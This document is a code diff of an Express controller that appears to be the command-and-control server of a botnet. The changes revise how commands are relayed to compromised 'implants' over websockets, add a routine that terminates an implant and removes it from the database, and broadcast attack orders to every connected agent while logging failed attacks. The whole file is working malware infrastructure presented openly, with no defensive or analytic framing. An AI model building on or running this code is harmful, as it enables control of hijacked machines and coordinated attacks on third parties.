@@ -1,46 +1,85 @@
 import { response } from "express";
 import fs from 'fs';
 import Operation from '../models/Operations_model.mjs';
+import Implant from '../models/Implant_model.mjs';
+import { writeLog } from "../Utils/writeLog.mjs";
 
 
-const send_cmd = async (clients, req, res) => {
+const send_cmd = async (clients, req, res, status_connections) => {
 
-    try {
-        
-        const clientId = req.params.id;
-        
-        const client = clients.agents.get(clientId);
+    const clientId = req.params?.id || "";
+    const client = clients.agents.get(clientId);
+
     
-        if (!client || client.readyState !== 1) {
-            return res.status(404).json({ error: 'Disconnected client' });
-        }
-    
-        const msgHandler = (msg) => {
+    for( const key in req.body ){
+        if(key === "finish"){
             try {
-                const parsed = JSON.parse(msg);
+                    try {
+                        client.send(JSON.stringify(req.body));
+                        client.close();
+                    } catch (error) {
+                        console.log("Implant not connected, removing from database");
+                    }
+            
+                    try {
+                        const foundImplant = await Implant.findOne({impl_id: clientId})
+                        await Implant.findByIdAndDelete(foundImplant._id);
+                    } catch (error) {
+                        console.log("Implant not in database");
+                    }
+            
+                    
+                clients.agents.delete(clientId);
+                status_connections.status_connections = status_connections.status_connections.filter(c=> c.id != clientId);
+
+                } catch (error) {
+                    
+                    return res.status(400).json({
+                        ok:false,
+                        msg:"Error removing implant"
+                    })
+                }
+
+            }else{
+
+                try {
                 
-                console.log(parsed);
-                res.status(200).json(parsed);
-            } catch (e) {
-                res.status(200).json({ result: msg });
-            }
-            client.off('message', msgHandler);
-        };
-    
-        client.on('message', msgHandler);
-        client.send(JSON.stringify(req.body));
-    
-        setTimeout(() => {
-            client.off('message', msgHandler);
-            if (!res.headersSent) {
-                res.status(504).json({ error: 'Timeout client error' });
-            }
-        }, 5000);
-    } catch (error) {
-        console.log(error);
-        
-    }    
+                    if (!client || client.readyState !== 1) {
+                        return res.status(404).json({ error: 'Disconnected client' });
+                    }
+
+                    const msgHandler = (msg) => {
+                        try {
+                            const parsed = JSON.parse(msg);
+                            
+                            res.status(200).json(parsed);
+                        } catch (e) {
+                            res.status(200).json({ result: msg });
+                        }
+                        client.off('message', msgHandler);
+                    };
+            
+                
+                    client.on('message', msgHandler);
+                    client.send(JSON.stringify(req.body));
+                
+                    setTimeout(() => {
+                        client.off('message', msgHandler);
+                        if (!res.headersSent) {
+                            res.status(504).json({ error: 'Timeout client error' });
+                        }
+                    }, 5000);
+
+            } catch (error) {
+                console.log(error);
+            }    
+        }
+    }   
+
+
 };
+
+
 const upload_file = async (clients, req, res) => {
     try {
         const clientId = req.params.id;
@@ -200,6 +239,7 @@ const botnet_attack=(clients, attacks_running, req, res = response)=>{
     const attack_name = Object.keys(req.body)[0];
     const attack_value=req.body[attack_name];
     const attack=req.body
+    attacks_running.botnetErrs = {};
 
     /* 
         Si es un ataque:
@@ -222,9 +262,39 @@ const botnet_attack=(clients, attacks_running, req, res = response)=>{
         }
     */
     
-    for (const [clientid, client] of clients.agents) {
-        client.send(JSON.stringify(req.body));
+   const msgHandler = (msg, client) => {
+    try {
+        const parsed = JSON.parse(msg);
+        if(parsed.status && parsed.status === "attack_error"){
+            writeLog(`${parsed.impl} failed in ${parsed.attack_type}`)
+            attacks_running.attacks = attacks_running.attacks.filter(a =>
+                a.attack_type !== parsed.attack_type
+            );
+        }
+        return;
+
+    } catch (e) {
+        res.status(500).json({ error: "Error!!" });
+        client.off('message', msgHandler);
     }
+    };
+
+
+    for (const [clientid, client] of clients.agents) {
+
+        try{
+            const sendsmsg = client.send(JSON.stringify(req.body));
+
+            console.log(sendsmsg);
+            
+            client.on('message', msgHandler);
+
+        }catch(err){
+            console.log(err);
+        }
+    }
+
+
 
 
     // Si el mensaje del implante hacia el backend falla, el controller limpia el estado de running_attacks en este punto
@@ -238,9 +308,7 @@ const botnet_attack=(clients, attacks_running, req, res = response)=>{
         }
     }
  
-    return res.status(200).json({msg:"Sended"})
-
-
+    return res.status(200).json({msg:"Sent"})
 
 
 /*     setTimeout(() => {
